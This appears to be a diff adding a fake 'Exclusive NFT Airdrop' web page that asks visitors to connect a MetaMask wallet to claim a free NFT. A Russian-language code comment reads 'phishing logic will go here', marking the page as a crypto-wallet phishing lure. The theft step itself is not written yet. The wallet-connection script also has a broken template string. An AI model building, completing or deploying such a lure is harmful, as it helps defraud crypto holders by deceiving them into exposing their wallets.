@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NFT Gift Claim</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            font-family: Arial;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        button {
+            background: #764ba2;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Exclusive NFT Airdrop</h1>
+        <p>Connect your wallet to claim your free NFT</p>
+        <button id="connectBtn">Connect Wallet</button>
+        <div id="walletInfo"></div>
+    </div>
+
+    <script>
+        document.getElementById('connectBtn').addEventListener('click', connectWallet);
+
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await ethereum.request({ 
+                        method: 'eth_requestAccounts' 
+                    });
+                    document.getElementById('walletInfo').innerHTML = 
+                        Connected: ${accounts[0]};
+                    
+                    // Фишинг логика будет здесь
+                    alert('NFT claim processing...');
+                    
+                } catch (error) {
+                    console.error(error);
+                }
+            } else {
+                alert('Please install MetaMask!');
+            }
+        }
+    </script>
+</body>
+</html>
